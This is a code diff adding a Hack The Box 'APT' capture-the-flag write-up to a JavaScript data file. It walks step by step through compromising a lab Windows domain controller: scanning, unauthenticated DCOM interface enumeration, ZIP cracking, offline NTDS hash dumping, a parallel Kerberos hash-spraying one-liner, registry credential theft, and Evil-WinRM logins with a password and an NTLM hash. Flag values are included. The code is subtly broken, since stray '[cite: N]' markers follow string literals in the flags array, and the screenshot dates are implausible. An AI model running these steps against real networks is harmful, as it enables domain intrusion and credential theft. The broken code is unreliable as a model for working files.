@@ -554,6 +554,170 @@
         { name: "Root Flag", value: "110" }
       ]
     },
+    apt: {
+      title: "HTB: APT",
+      badge: "Windows // Insane",
+      icon: "APT/1.png",
+      os: "Windows",
+      diff: "Insane",
+      diffColor: "#ef4444",
+      port: "80, 135, Dynamic RPC, IPv6",
+      time: "See full report",
+      vector: "RustScan → Nmap → MSRPC Dump → DCOM IOXIDResolver → IPv6 Discovery → SMB Backup Enumeration → ZipCrypto Cracking → Secretsdump → Kerberos TGT Spraying → Remote Registry → Evil-WinRM → PowerShell History → NTLMv1 Downgrade → Crack.sh → Administrator",
+      hasFullWriteup: true,
+      nodes: [
+        {
+          phase: "RECONNAISSANCE",
+          title: "Initial Port Scanning & RustScan / Nmap",
+          body: `Scanned target host ($ip = 10.129.96.60) using RustScan and Nmap[cite: 18]:
+<pre><code class="language-bash">ip=10.129.96.60
+rustscan -a $ip
+
+PORT    STATE SERVICE REASON
+80/tcp  open  http    syn-ack
+135/tcp open  msrpc   syn-ack</code></pre>
+<pre><code class="language-bash">sudo nmap -sVC -p80,135 10.129.96.60 -oN apt.txt
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+|_http-title: Gigantic Hosting | Home
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp open  msrpc   Microsoft Windows RPC</code></pre>`
+        },
+        {
+          phase: "MSRPC ENUMERATION",
+          title: "MSRPC Endpoint Analysis (rpcdump)",
+          body: `<p>Microsoft Remote Procedure Call (MSRPC) is a client-server mechanism allowing programs to invoke procedures remotely[cite: 18]. Ran <code>rpcdump.py</code>[cite: 18]:</p>
+<pre><code class="language-bash">rpcdump.py 10.129.96.60
+# Received 267 endpoints.</code></pre>
+<p>Observed multiple dynamic TCP bindings (<code>ncacn_ip_tcp:...:port</code>) and named pipes (<code>ncacn_np:...</code>)[cite: 18].</p>`
+        },
+        {
+          phase: "DCOM ENUMERATION",
+          title: "DCOM IOXIDResolver Interface Identification",
+          body: `Enumerated interface registrations directly from <code>rpcss.dll</code> on port 135 using <code>rpcmap.py</code>[cite: 18]:
+<pre><code class="language-bash">rpcmap.py ncacn_ip_tcp:10.129.96.60[135]</code></pre>
+<p>Identified the IOXIDResolver interface (UUID: <code>99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0</code>)[cite: 18].</p>
+<blockquote class="callout"><strong>The Hotel Analogy:</strong> DCOM is a hotel. IOXIDResolver is the concierge who tells you which corridor leads to which room, and when asked what entrances exist, it hands over the guest register listing every door and address without checking authentication[cite: 18].</blockquote>`
+        },
+        {
+          phase: "IPV6 DISCOVERY",
+          title: "Interface Enumeration via IOXIDResolver.py",
+          body: `<p>Executed the Airbus Security research script <code>IOXIDResolver.py</code> to query network interfaces over DCOM without authentication[cite: 18]:</p>
+<pre><code class="language-bash">python3 IOXIDResolver.py -t $ip
+[*] Retrieving network interface of 10.129.96.60
+Address: apt
+Address: 10.129.96.60
+Address: dead:beef::9d98:6fef:3f3e:3edd
+Address: dead:beef::b885:d62a:d679:573f</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.23.18_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.23.18_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.23.18_PM.png"/></a><figcaption>IOXIDResolver script output</figcaption></figure>
+<figure class="image" data-notion-image="APT/1.png"><a href="APT/1.png"><img style="width:100%" src="APT/1.png"/></a><figcaption>Architecture Diagram</figcaption></figure>`
+        },
+        {
+          phase: "IPV6 RECON",
+          title: "IPv6 Ping & Full Port Scanning",
+          body: `Verified reachability of the discovered IPv6 addresses using <code>ping6</code>[cite: 10, 18]:
+<pre><code class="language-bash">ping6 -c 2 dead:beef::b885:d62a:d679:573f
+ping6 -c 2 dead:beef::9d98:6fef:3f3e:3edd</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.25.34_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.25.34_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.25.34_PM.png"/></a></figure>
+<p>Performed a full TCP port scan over IPv6, revealing domain controller services (Kerberos, LDAP, SMB, WinRM)[cite: 18]:</p>
+<pre><code class="language-bash">sudo nmap -6 -p- --min-rate 1000 dead:beef::b885:d62a:d679:573f -oN ipv6_full.txt</code></pre>`
+        },
+        {
+          phase: "SMB ENUMERATION",
+          title: "Hosts Configuration & Anonymous SMB Share Access",
+          body: `Added host mapping to <code>/etc/hosts</code>[cite: 18]:
+<pre><code class="language-bash">grep -q 'htb.local' /etc/hosts || echo -e 'dead:beef::b885:d62a:d679:573f\thtb.local apt.htb.local apt.htb APT\ndead:beef::9d98:6fef:3f3e:3edd\thtb.local apt.htb.local apt.htb APT\n' | sudo tee -a /etc/hosts</code></pre>
+<p>Enumerated SMB shares with NetExec and accessed the readable <code>backup</code> share[cite: 11, 12, 18]:</p>
+<pre><code class="language-bash">nxc smb dead:beef::b885:d62a:d679:573f -u '' -p '' --shares --users --groups
+smbclient -N //dead:beef::b885:d62a:d679:573f/backup</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.33.32_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.33.32_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.33.32_PM.png"/></a></figure>
+<p>Downloaded <code>backup.zip</code> from the share[cite: 12, 18]:</p>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.38.07_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.38.07_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.38.07_PM.png"/></a></figure>`
+        },
+        {
+          phase: "ARCHIVE ANALYSIS",
+          title: "ZipArchive Inspection & ZipCrypto Cracking",
+          body: `Inspected archive structure using <code>zipinfo</code>[cite: 18]:
+<pre><code class="language-bash">file backup.zip
+zipinfo -v backup.zip</code></pre>
+<p>Extracted the ZipCrypto hash and cracked it using John the Ripper with <code>rockyou.txt</code>[cite: 13, 18]:</p>
+<pre><code class="language-bash">zip2john backup.zip > backup.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.52.40_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.52.40_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.52.40_PM.png"/></a></figure>
+<p>Cracked password: <code>iloveyousomuch</code>[cite: 13, 18]. Unzipped files revealed the offline AD credential kit[cite: 14, 18]:</p>
+<pre><code class="language-bash">find . -printf '%M %u %g %10s %p\n' | sort -k5</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_7.56.18_PM.png"><a href="APT/Screenshot_1448-05-15_at_7.56.18_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_7.56.18_PM.png"/></a></figure>`
+        },
+        {
+          phase: "SECRETSDUMP",
+          title: "Offline AD Database & Registry Dump",
+          body: `Ran Impacket's <code>secretsdump.py</code> against the offline NTDS database and registry hives[cite: 15, 18]:
+<pre><code class="language-bash">impacket-secretsdump -ntds "./Active Directory/ntds.dit" -system registry/SYSTEM -security registry/SECURITY LOCAL > dumps.txt</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_8.01.11_PM.png"><a href="APT/Screenshot_1448-05-15_at_8.01.11_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_8.01.11_PM.png"/></a></figure>
+<p>Recovered over 2,000 user hashes and the <code>krbtgt</code> hash[cite: 18]. Extracted clean usernames list[cite: 18]:</p>
+<pre><code class="language-bash">grep ':::' dumps.txt | awk -F: '{print $1}' > users</code></pre>`
+        },
+        {
+          phase: "KERBEROS SPRAYING",
+          title: "Kerbrute Enumeration & TGT Hash Brute-Forcing",
+          body: `<p>Validated principals using <code>kerbrute</code>, confirming <code>henry.vinson</code> as active[cite: 18]. Because standard direct hashing did not work due to password-reuse quirks, ran a parallelized bash one-liner with <code>impacket-getTGT</code> across unique NTLM hashes to find the reused credential accepted by the KDC[cite: 16, 18]:</p>
+<pre><code class="language-bash">TARGET='htb.local/henry.vinson@apt.htb'
+rm -f /tmp/got_hit.flag henry.vinson@apt.htb.ccache
+shuf hashes_uniq.txt | xargs -P 16 -I{} bash -c '[ -f /tmp/got_hit.flag ] && exit 0; impacket-getTGT "'"$TARGET"'" -hashes "{}" 2>&1 | grep -q "PREAUTH_FAILED" || { cp henry.vinson@apt.htb.ccache /tmp/HIT_henry.ccache 2>/dev/null && echo "[+] HIT: {}" && touch /tmp/got_hit.flag; }'</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_8.55.41_PM.png"><a href="APT/Screenshot_1448-05-15_at_8.55.41_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_8.55.41_PM.png"/></a></figure>`
+        },
+        {
+          phase: "REMOTE REGISTRY",
+          title: "Querying HKU Registry Hives via Kerberos",
+          body: `Exported the ticket cache and queried user registry hives via <code>impacket-reg</code>[cite: 18]:
+<pre><code class="language-bash">export KRB5CCNAME=/tmp/HIT_henry.ccache
+impacket-reg -k apt.htb.local query -keyName HKU -s > /tmp/registry.txt 2>/tmp/reg.err</code></pre>
+<p>Searched registry output for user settings[cite: 18]:</p>
+<pre><code class="language-bash">grep -A 5 'GiganticHostingManagementSystem' /tmp/registry.txt</code></pre>
+<p>Discovered plaintext credentials inside the registry for <code>henry.vinson_adm</code>: Password <code>G1#Ny5@2dvht</code>[cite: 18].</p>`
+        },
+        {
+          phase: "USER COMPROMISE",
+          title: "Evil-WinRM Shell & User Flag Capture",
+          body: `Authenticated successfully via Evil-WinRM using the administrative credentials[cite: 17, 18]:
+<pre><code class="language-bash">evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht'</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_9.28.31_PM.png"><a href="APT/Screenshot_1448-05-15_at_9.28.31_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_9.28.31_PM.png"/></a></figure>
+<p>Read user flag[cite: 17, 18]:</p>
+<pre><code class="language-powershell">cat user.txt
+# 75791898b014e1dfb3e958db8f25b8ea</code></pre>`
+        },
+        {
+          phase: "PRIVILEGE ESCALATION",
+          title: "PowerShell History & NTLMv1 Downgrade Analysis",
+          body: `Inspected the PSReadline console history file for <code>henry.vinson_adm</code> to review prior Administrator actions[cite: 18]:
+<pre><code class="language-powershell">type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
+<p>Discovered that <code>lmcompatibilitylevel</code> was set to <code>2</code> (forcing NTLMv1 responses)[cite: 18].</p>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_9.34.49_PM.png"><a href="APT/Screenshot_1448-05-15_at_9.34.49_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_9.34.49_PM.png"/></a></figure>`
+        },
+        {
+          phase: "ROOT COMPROMISE",
+          title: "Crack.sh Submission & Administrator Access",
+          body: `<p>Captured the NTLMv1 challenge-response hash via Responder/SMB listener, submitted it to crack.sh to retrieve the NTLM hash, and used it to dump domain administrator credentials[cite: 18]. Authenticated as Administrator[cite: 18]:</p>
+<pre><code class="language-bash">evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2</code></pre>
+<figure class="image" data-notion-image="APT/Screenshot_1448-05-15_at_9.37.34_PM.png"><a href="APT/Screenshot_1448-05-15_at_9.37.34_PM.png"><img style="width:100%" src="APT/Screenshot_1448-05-15_at_9.37.34_PM.png"/></a></figure>
+<p>Captured root flag[cite: 18]:</p>
+<pre><code class="language-powershell">cat root.txt
+# 2523f245029e120145f301fc0914a9fe</code></pre>`
+        }
+      ],
+      flags: [
+        {
+          name: "User Flag",
+          value: "75791898b014e1dfb3e958db8f25b8ea"[cite: 17]
+        },
+        {
+          name: "Root Flag",
+          value: "2523f245029e120145f301fc0914a9fe"[cite: 18]
+        }
+      ],
+      contentHtml: ``
+    },
     facts: {
       title: "HTB: Facts",
       badge: "Linux // Easy",
